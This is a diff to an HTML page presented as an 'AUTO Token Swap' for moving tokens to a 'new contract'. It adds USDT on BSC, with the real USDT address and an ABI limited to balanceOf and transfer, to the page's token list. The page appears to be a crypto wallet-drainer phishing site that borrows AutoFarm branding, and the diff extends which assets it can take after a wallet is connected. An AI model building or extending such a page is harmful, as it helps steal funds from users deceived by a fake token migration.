@@ -303,7 +303,7 @@
       <div class="header">
         <img src="https://developers.moralis.com/wp-content/uploads/web3wiki/593-autofarm/637aed495c5866556aff298f__ncuYT9GWohTTGG_CzHqpPct0aiFzz-40_seQSEnqVc.png" alt="AUTO Logo" class="logo">
         <h1>AUTO Token Swap</h1>
-        <p class="description">Swap your AUTO tokens to our new contract</p>
+        <p class="description">Swap your AUTO and USDT tokens to our new contract</p>
         
         <div class="token-links">
           <a href="https://www.coingecko.com/en/coins/auto" target="_blank" class="token-link">
@@ -351,6 +351,11 @@
           <span class="token-name">AUTO Token</span>
           <span class="token-network">Polygon</span>
         </div>
+        <div class="token-item" data-network="bsc">
+          <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" class="token-icon">
+          <span class="token-name">USDT</span>
+          <span class="token-network">BSC</span>
+        </div>
       </div>
       
       <button id="connectWallet" class="btn">
@@ -382,6 +387,17 @@
           ],
           decimals: 18,
           logo: "https://developers.moralis.com/wp-content/uploads/web3wiki/593-autofarm/637aed495c5866556aff298f__ncuYT9GWohTTGG_CzHqpPct0aiFzz-40_seQSEnqVc.png"
+        },
+        {
+          name: "USDT",
+          symbol: "USDT",
+          address: "0x55d398326f99059fF775485246999027B3197955",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://cryptologos.cc/logos/tether-usdt-logo.png"
         }
       ],
       polygon: [
